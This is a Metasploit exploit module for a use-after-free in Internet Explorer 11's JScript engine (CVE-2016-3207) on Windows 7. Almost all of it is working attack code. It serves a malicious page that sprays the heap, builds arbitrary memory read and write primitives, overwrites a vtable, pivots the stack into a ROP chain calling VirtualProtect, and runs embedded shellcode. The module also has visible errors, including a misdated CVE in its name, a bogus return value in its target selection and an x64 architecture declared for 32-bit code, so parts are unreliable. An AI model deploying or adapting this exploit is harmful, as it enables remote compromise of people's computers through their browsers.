##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "CVE-2106-3207",
            'Description'    => %q{
              This module exploits Use-After-Free vulnerability (CVE-2016-3207)
              present in the JScript engine of Internet Explorer.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Brian Pak (Theori)',          # Original RE research and exploitation
                'Hyeonhak Kim'            # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'IE 11 on Windows 7', { } ],
                [ 'IE 11.0.9600.17420 on Windows 7', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2016-3207' ]
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "June 23 2016",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/rv:(\d*.\d+)/).flatten[0] || ""
  
      cm_name = "IE #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
	if ((!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
      return 1
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = ""
      rop_payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      p = payload.encoded.unpack("I*")
      s = ""
      for i in p
        s += i.to_s + ", "
      end

      js_p = s[0..-3]

      html = <<-HTML
      <html>
        <body>
          <script>
            var arr = new Array(100000);
            var arr1 = new Array(10000);
            var ab2 = new ArrayBuffer(0x1337);

            function sprayHeap() {
              for (var i = 0; i < 100000; i++) {
                arr[i] = new Uint8Array(ab2);
              }
            }

            // used to trigger collection of large heap blocks
            function spray1() {
                for (var i = 0; i < arr1.length; i++) {
                    arr1[i] = new ArrayBuffer(1024);
                }
            }

            function pwn() {
              var lengthIdx;
              var mv;
              var jscript9Base;
              var ab = new ArrayBuffer(2123 * 1024);
              var ia = new Int8Array(ab);

              spray1();
              detach(ab);
              setTimeout(main, 50, ia);

              function detach(ab) {
                postMessage("", "*", [ab]);
              }

              function ub(sb) {
                return (sb < 0) ? sb + 0x100 : sb;
              }

              function setAddress(addr) {
                ia[lengthIdx + 4] = addr & 0xFF;
                ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
                ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
                ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
              }

              function readN(addr, n) {
                if (n != 4 && n != 8)
                  return 0;
                setAddress(addr);
                var ret = 0;
                for (var i = 0; i < n; i++)
                  ret |= (mv[i] << (i * 8))
                return ret;
              }

              function writeN(addr, val, n) {
                if (n != 2 && n != 4 && n != 8)
                  return;
                setAddress(addr);
                for (var i = 0; i < n; i++)
                  mv[i] = (val >> (i * 8)) & 0xFF
              }

              function main(ia) {
                  // trigger collection
                  arr1 = null;
                  CollectGarbage();

                  // allocate objects
                  sprayHeap();

                  for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00; i++)
                  {
                      if (ia[i] === undefined)
                          return;
                  }
                  ia[i]++;
                  lengthIdx = i;
                  try {
                      for (var i = 0; arr[i].length != 0x1338; i++);
                  } catch (e) {
                      return;
                  }

                  mv = arr[i];
                  var bufaddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 + 2]) << 16 | ub(ia[lengthIdx + 4 + 3]) << 24;
                  var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1b]) << 8 | ub(ia[lengthIdx - 0x1a]) << 16 | ub(ia[lengthIdx - 0x19]) << 24;
                  // Calculate jscript9 base from vtable address
                  jscript9Base = (vtable - 0xc6bec) & 0xFFFF0000;
                  // VirtualProtect entry in import table
                  var vpaddr = readN(jscript9Base + 0x3e4244, 4);

                  var vtbladdr = bufaddr;
                  var ropaddr = bufaddr + 0x200;
                  var shcodeaddr = bufaddr + 0x300;

                  // 0x4C: GetPropertyReference
                  // 0x104: SkipsPrototype
                  // These get called, so we need to copy the original
                  writeN(vtbladdr + 0x4C, readN(vtable + 0x4C, 4), 4);
                  writeN(vtbladdr + 0x104, readN(vtable + 0x104, 4), 4);

                  // Stack-pivot gadget in jscript 9
                  // mov esp, ebx; pop ebx; ret
                  writeN(vtbladdr + 0x188, jscript9Base + 0x10dc32, 4);

                  var rop = [
                      0x41414141, vpaddr, shcodeaddr, shcodeaddr, 0x200, 0x40, ropaddr
                  ];
                  for (var i = 0; i < rop.length; i++)
                      writeN(ropaddr + i * 4, rop[i], 4);

                  // shellcode that will be vprot'd RWX
                  var sc = [
                      #{js_p}
                  ];
                  
                  for (var i = 0; i < sc.length; i++)
                      writeN(shcodeaddr + i * 4, sc[i], 4);

                  // update the length so that subarray works
                  ia[lengthIdx + 0x00] = 0xff;
                  ia[lengthIdx + 0x01] = 0xff;
                  ia[lengthIdx + 0x02] = 0xff;
                  ia[lengthIdx + 0x03] = 0x7e;

                  // overwrite with our fake vtable addr
                  ia[lengthIdx - 0x1c] = (vtbladdr >> 0) & 0xff;
                  ia[lengthIdx - 0x1b] = (vtbladdr >> 8) & 0xff;
                  ia[lengthIdx - 0x1a] = (vtbladdr >> 16) & 0xff;
                  ia[lengthIdx - 0x19] = (vtbladdr >> 24) & 0xff;

                  mv.subarray(ropaddr);
              }
          }

            setTimeout(pwn, 50);
          </script>
        </body>
      </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
      end
  
      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
